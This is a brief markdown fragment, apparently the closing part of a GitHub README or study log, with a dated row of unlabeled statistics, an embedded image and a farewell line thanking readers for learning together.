| November 10, 2024 | 188      |       1,250ª |          26ª |      4,115ª |        56ª | 54,596   |       412 |

<br>

![image](https://github.com/user-attachments/assets/90f916be-aae6-4ddf-a0ee-4234f1d331c3)

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>       
